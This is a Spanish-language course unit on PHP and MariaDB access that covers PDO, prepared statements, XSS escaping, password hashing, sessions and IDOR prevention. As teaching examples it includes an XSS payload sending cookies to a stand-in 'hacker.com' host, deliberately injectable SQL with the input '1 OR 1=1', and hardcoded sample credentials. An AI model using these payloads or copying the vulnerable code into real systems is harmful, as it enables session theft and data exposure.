# Tema 3: Acceso a bases de datos desde el lenguaje servidor (PHP + MariaDB)

Este tema explica cómo una aplicación web conecta con una base de datos para
almacenar, consultar y proteger la información de los usuarios. La idea central
es que el servidor web, no el navegador, debe ser el que acceda a la base de
datos.

## 1. Arquitectura web y conexión con PDO

### 1.1 Modelo de tres capas

Una aplicación web dinámica suele seguir este flujo:

```text
Navegador → Apache/PHP → MariaDB
```

- **Capa de presentación:** el navegador interpreta HTML, CSS y JavaScript.
- **Capa de lógica de negocio:** PHP procesa datos, valida entradas y aplica
  reglas.
- **Capa de almacenamiento:** MariaDB guarda la información de forma persistente.

La base de datos no se conecta directamente con el navegador; la comunicación se
realiza a través del servidor web y PHP.

### 1.2 Socket UNIX frente a TCP/IP

Cuando PHP se conecta a MariaDB, puede hacerlo de dos maneras:

- **Socket UNIX:** se usa cuando la base de datos está en la misma máquina.
  Suele ir por un archivo del sistema, por ejemplo `/run/mysqld/mysqld.sock`.
  Es más rápido y eficiente en un entorno local.
- **TCP/IP:** se usa cuando la base de datos está en otra máquina o contenedor.
  La conexión va por el puerto `3306`.

### 1.3 Principio de mínimo privilegio

El servicio web no debe usar el usuario `root` para conectarse a la BBDD.
Debe crearse un usuario específico para la aplicación.

```sql
CREATE USER 'iaw_app'@'localhost' IDENTIFIED BY 'IaW_2026_segura';
GRANT ALL PRIVILEGES ON biblioteca_iaw.* TO 'iaw_app'@'localhost';
FLUSH PRIVILEGES;
```

Esto permite limitar el acceso a una base de datos concreta y evitar el uso de
credenciales demasiado potentes.

### 1.4 Conexión mediante PDO

PDO (PHP Data Objects) es la capa recomendada para conectar PHP con bases de
datos relacionales.

```php
<?php
$servidor   = "localhost";
$base_datos = "biblioteca_iaw";
$usuario    = "iaw_app";
$clave      = "IaW_2026_segura";

try {
    $dsn = "mysql:host=$servidor;dbname=$base_datos;charset=utf8mb4";

    $conexion = new PDO($dsn, $usuario, $clave, [
        PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        PDO::ATTR_EMULATE_PREPARES   => false,
    ]);
} catch (PDOException $e) {
    error_log("Error de conexión SQL: " . $e->getMessage());
    die("Error crítico: No se ha podido conectar con la base de datos.");
}
```

Ventajas de PDO:

- usa sentencias preparadas
- permite manejar errores con excepciones
- funciona con diferentes motores de base de datos
- facilita la seguridad y la portabilidad

## 2. Definición de esquemas y relaciones

### 2.1 Crear la estructura de la base de datos

La capa de servidor puede crear la base de datos y sus tablas si todavía no
existen.

```php
<?php
$conexion = new PDO("mysql:host=localhost;charset=utf8mb4", "iaw_app", "IaW_2026_segura");
$conexion->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

$conexion->exec("CREATE DATABASE IF NOT EXISTS biblioteca_iaw CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci");
$conexion->exec("USE biblioteca_iaw");

$conexion->exec(
    "CREATE TABLE IF NOT EXISTS usuarios (
        id INT AUTO_INCREMENT PRIMARY KEY,
        nombre VARCHAR(50) NOT NULL,
        email VARCHAR(100) NOT NULL UNIQUE,
        password VARCHAR(255) NOT NULL
    ) ENGINE=InnoDB"
);

$conexion->exec(
    "CREATE TABLE IF NOT EXISTS libros (
        id INT AUTO_INCREMENT PRIMARY KEY,
        titulo VARCHAR(100) NOT NULL,
        autor VARCHAR(100) NOT NULL,
        anio SMALLINT NULL,
        usuario_id INT NULL,
        CONSTRAINT fk_libros_usuarios
            FOREIGN KEY (usuario_id)
            REFERENCES usuarios(id)
            ON DELETE CASCADE
    ) ENGINE=InnoDB"
);
```

### 2.2 Integridad referencial

La clave foránea asegura que no existan relaciones rotas:

- `usuarios` es la tabla principal.
- `libros` depende de `usuarios` mediante `usuario_id`.
- Si se elimina un usuario, los libros asociados se eliminan automáticamente
  con `ON DELETE CASCADE`.

Esto evita que queden registros huérfanos.

### 2.3 Elementos importantes del esquema

- `ENGINE=InnoDB`: motor transaccional que soporta claves foráneas.
- `UNIQUE`: impide duplicados, por ejemplo dos usuarios con el mismo email.
- `VARCHAR(255)`: recomendado para almacenamientos de contraseñas hash.

## 3. CRUD y consultas preparadas

El término CRUD reúne las operaciones básicas de cualquier sistema de
persistencia:

| Operación | SQL | Uso |
| --- | --- | --- |
| Create | `INSERT INTO` | crear registros |
| Read | `SELECT ... FROM` | consultar datos |
| Update | `UPDATE ... SET` | modificar registros |
| Delete | `DELETE FROM` | eliminar registros |

### 3.1 Inyección SQL

La inyección SQL aparece cuando los datos del usuario se concatenan de forma
directa en la consulta.

```php
// Vulnerable
$sql = "SELECT * FROM libros WHERE id = " . $_GET["id"];
$conexion->query($sql);
```

Si el usuario manda `1 OR 1=1`, se puede devolver toda la tabla.

### 3.2 Consultas preparadas

Las consultas preparadas separan dos fases:

1. **Preparación:** se envía la sentencia con marcadores (`:id`, `:titulo`)
2. **Ejecución:** se envían los valores por separado

Esto hace que el motor trate los datos como valores literales y no como parte de
la sintaxis SQL.

```php
$sql = "SELECT * FROM libros WHERE id = :id";
$stmt = $conexion->prepare($sql);
$stmt->execute([":id" => $_GET["id"]]);
$libro = $stmt->fetch();
```

Ejemplo con `INSERT`:

```php
$sql = "INSERT INTO libros (titulo, autor, anio, usuario_id)
        VALUES (:titulo, :autor, :anio, :usuario_id)";

$stmt = $conexion->prepare($sql);
$stmt->execute([
    ':titulo' => $titulo,
    ':autor' => $autor,
    ':anio' => $anio,
    ':usuario_id' => $_SESSION['usuario_id'],
]);
```

Esto es esencial para la seguridad.

## 4. Seguridad en la entrada y salida de datos

### 4.1 XSS

Los ataques XSS ocurren cuando un dato introducido por el usuario se imprime en
HTML sin escapar.

Ejemplo de entrada maliciosa:

```html
<script>document.location='http://hacker.com/robar.php?cookie='+document.cookie;</script>
```

Si se imprime sin filtrar, el navegador puede ejecutarlo.

### 4.2 `htmlspecialchars()`

Para evitarlo, se debe escapar la salida HTML:

```php
<p>
    <strong><?= htmlspecialchars($libro["titulo"], ENT_QUOTES, 'UTF-8') ?></strong>
    - <?= htmlspecialchars($libro["autor"], ENT_QUOTES, 'UTF-8') ?>
</p>
```

`htmlspecialchars()` convierte caracteres especiales en entidades HTML, como:

- `<` → `&lt;`
- `>` → `&gt;`
- `&` → `&amp;`
- `"` → `&quot;`
- `'` → `&#039;`

### 4.3 Validación en servidor

La validación HTML (`required`, `pattern`, etc.) mejora la experiencia, pero no
sustituye a la validación del servidor.

```php
$titulo = trim($_POST['titulo'] ?? '');
$autor = trim($_POST['autor'] ?? '');
$anio = trim($_POST['anio'] ?? '');

if ($titulo === '' || $autor === '') {
    die('Error: El título y el autor son obligatorios.');
}

if ($anio !== '') {
    if (!filter_var($anio, FILTER_VALIDATE_INT)) {
        die('Error: El año debe ser un número entero válido.');
    }

    $anio_int = (int)$anio;
    if ($anio_int < 1 || $anio_int > 2100) {
        die('Error: El año introducido está fuera del rango válido.');
    }
}
```

La regla clave es: validar en PHP, escapar en HTML.

## 5. Autenticación segura y sesiones

### 5.1 Almacenamiento seguro de contraseñas

Las contraseñas no se guardan en texto plano. Se usa `password_hash()` para
crear un hash seguro y `password_verify()` para comprobarla en el login.

```php
$hash = password_hash($passwordPlana, PASSWORD_DEFAULT);

if (password_verify($passwordIntroducida, $hashAlmacenado)) {
    // contraseña correcta
}
```

Este tipo de hash incluye:

- sal aleatoria
- factor de costo configurable
- resistencia frente a ataques de fuerza bruta

### 5.2 Sesiones en PHP

El protocolo HTTP es sin estado. Para mantener al usuario autenticado, PHP usa
sesiones.

```php
session_start();
$_SESSION['usuario_id'] = 1;
$_SESSION['usuario_nombre'] = 'Ana';
```

El navegador recibe una cookie llamada `PHPSESSID`, que contiene un identificador
único. El servidor usa ese identificador para recuperar en disco la sesión del
usuario.

El flujo habitual es:

1. Usuario envía credenciales
2. El servidor valida la contraseña
3. Guarda la identidad en `$_SESSION`
4. Envía la cookie al navegador
5. En cada página protegida, se comprueba la sesión

### 5.3 Cierre de sesión

```php
session_start();
session_unset();
session_destroy();
header('Location: login.php');
exit;
```

Esto elimina variables y cookie de sesión, devolviendo al usuario al login.

## 6. Aislamiento multiusuario y prevención de IDOR

### 6.1 Qué es una IDOR

Una IDOR (Insecure Direct Object Reference) ocurre cuando un usuario puede
modificar el identificador de un recurso y acceder al contenido de otra persona.

Ejemplo: si el usuario hace esto:

```text
http://servidor/eliminar.php?id=4
```

y el script elimina directamente el libro con ese `id`, entonces podría borrar el
contenido de otro usuario.

### 6.2 Solución: filtrar por la sesión

La clave primaria del usuario no debe venir del formulario ni de la URL; debe
obtenerse de `$_SESSION['usuario_id']` y aplicarse en todas las consultas.

```sql
SELECT id, titulo, autor, anio
FROM libros
WHERE usuario_id = :usuario_id
ORDER BY titulo;
```

```sql
UPDATE libros
SET titulo = :titulo, autor = :autor, anio = :anio
WHERE id = :id AND usuario_id = :usuario_id;
```

```sql
DELETE FROM libros
WHERE id = :id AND usuario_id = :usuario_id;
```

Si el `id` no pertenece al usuario autenticado, la consulta afecta a 0 filas y
los datos del resto quedan protegidos.

## 7. Rendimiento y optimización con índices

### 7.1 ¿Qué es un índice?

Un índice es una estructura adicional que acelera la búsqueda sobre columnas
frecuentemente consultadas.

- **Sin índice:** el motor debe recorrer toda la tabla.
- **Con índice:** el motor usa una estructura de búsqueda más rápida.

### 7.2 `EXPLAIN`

`EXPLAIN` permite ver cómo MariaDB planea ejecutar una consulta.

```sql
EXPLAIN SELECT * FROM libros WHERE usuario_id = 1;
```

Columnas importantes:

- `type`: indica el tipo de acceso
- `possible_keys`: índices candidatos
- `key`: índice realmente usado
- `rows`: número estimado de filas leídas
- `Extra`: información adicional

Un valor crítico es `ALL`, porque significa que se recorre la tabla completa.

### 7.3 Creación de un índice

```sql
CREATE INDEX idx_libros_usuario ON libros(usuario_id);
```

Esto mejora el rendimiento de consultas por usuario y reduce el número de filas
examinadas.

## 8. Banco de preguntas típicas

### P1. ¿Por qué se recomienda PDO frente a `mysql_*`?

Porque `mysql_*` está obsoleto y no ofrece sentencias preparadas seguras ni una
API moderna. PDO además permite manejar errores, usar consultas preparadas y
trabajar de forma más segura con múltiples tipos de bases de datos.

### P2. ¿Cuál es la diferencia entre `fetch()` y `fetchAll()`?

- `fetch()`: devuelve una fila cada vez y es útil para un resultado individual.
- `fetchAll()`: devuelve todas las filas de golpe y es útil para listados.

### P3. ¿Qué ocurre si se borra una fila padre con relación `ON DELETE CASCADE`?

El motor elimina automáticamente las filas hijas relacionadas, manteniendo la
integridad referencial.

### P4. ¿Qué es XSS?

Es un ataque en el que el navegador ejecuta código malicioso procedente de datos
no validados y mostrados en la página.

### P5. ¿Qué es la validación en servidor?

Es la comprobación que se hace en PHP antes de guardar o mostrar los datos. Es
la defensa real frente a entradas maliciosas.

## Conclusión

El acceso a bases de datos desde un lenguaje de servidor es una parte esencial
de cualquier aplicación web. El desarrollo correcto implica:

- usar `PDO`
- usar consultas preparadas
- validar y escapar datos
- proteger credenciales
- gestionar sesiones de forma segura
- aislar datos por usuario
- optimizar consultas con índices

Sin estos principios, una aplicación web puede quedar expuesta a vulnerabilidades
serias y a fallos de integridad.

## Referencias

- Manual oficial de PHP: funciones de PDO, sesiones y seguridad.
- Manual oficial de MariaDB/MySQL: DDL, integridad referencial e índices.
- Material de la unidad de IAW.
